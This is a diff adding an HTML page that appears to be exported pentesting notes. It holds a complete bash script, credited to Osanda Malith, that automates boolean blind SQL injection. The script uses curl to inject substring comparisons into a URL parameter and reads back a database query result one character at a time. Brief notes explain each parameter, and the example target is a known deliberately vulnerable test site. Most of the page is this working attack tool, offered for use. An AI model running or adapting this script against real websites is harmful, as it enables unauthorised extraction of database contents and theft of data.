@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>scripts</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>scripts</h1><br /><br /><a
+      href="https://osandamalith.com/2015/08/05/automated-blind-sql-injector/" target="_blank">https://osandamalith.com/2015/08/05/automated-blind-sql-injector/</a>
+    (python,bash,java) see below<br /><br /><span style="text-decoration:underline;">Bash script (by Osanda
+      Malith)</span> fater than the
+    other<br /><code>./bssqli.sh </code><code><span style="color:#ff8700;">[maxlength] </span></code><code><span style="color:#00ff00;">[query]</span></code><br />
+    <div class="codebox">
+      <div class="codebox">
+        #!/bin/bash<br />#./bssqli.sh&nbsp;20&nbsp;&quot;select&nbsp;user()&quot;<br /><br />export&nbsp;URL=&quot;CHANGE&nbsp;ME!!!!!!:&nbsp;http://testphp.vulnweb.com/artists.php?artist=2&quot;<br />export&nbsp;truestring=&quot;CHANGE&nbsp;ME!!!!!!!:&nbsp;This&nbsp;is&nbsp;been&nbsp;a&nbsp;successfull&nbsp;query!&nbsp;&quot;<br />export&nbsp;maxlength=$1<br />export&nbsp;result=&quot;&quot;<br />export&nbsp;query=$2<br />charset=`echo&nbsp;{0..9}&nbsp;{A..x}&nbsp;\.&nbsp;\:&nbsp;\,&nbsp;\-&nbsp;\_&nbsp;\@`<br /><br />for&nbsp;((j=1;j&lt;$maxlength;j+=1));&nbsp;do<br />
+        for&nbsp;i&nbsp;in&nbsp;$charset;&nbsp;do<br />
+        export&nbsp;str=`echo&nbsp;-n&nbsp;$i|&nbsp;od&nbsp;-A&nbsp;n&nbsp;-t&nbsp;x1&nbsp;|sed&nbsp;&#39;s/&nbsp;//g&#39;`<br />
+        export&nbsp;hex=0x$str<br />
+        curl&nbsp;-s&nbsp;&quot;$URL&nbsp;and&nbsp;substring(($query),$j,1)=$hex--&nbsp;-&quot;&nbsp;|&nbsp;grep&nbsp;&quot;$truestring&quot;&nbsp;&amp;&gt;&nbsp;/dev/null<br />
+        if&nbsp;[&nbsp;&quot;$?&quot;&nbsp;==&nbsp;&quot;0&quot;&nbsp;]<br /> then<br /> echo&nbsp;Found:&nbsp;$i<br />
+        export&nbsp;result+=$i<br /> break<br /> fi<br /> done<br />done<br /><br />echo&nbsp;Result:&nbsp;$result</div>
+    </div><br /> ▪ <span style="color:#ff8700;">maxlength</span> → first parameter of our command, this is the maximum
+    expected length of the string that we want to extract<br /> ▪ <span style="color:#00ff00;">query</span> → second
+    parameter of our command, is the result that we want to retrieve. It can give us max 1 result no more<br /> - for
+    specific queries see <a
+      href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" target="_blank">http://pentestmonkey.net/category/cheat-sheet/sql-injection</a><br />
+    ▪ charset → characters that we want to test<br /> ▪ truestring → The string returned by the Web server which our
+    script expects to see when for true Boolean SQL queries.
+  </div>
+</body>
+
+</html>
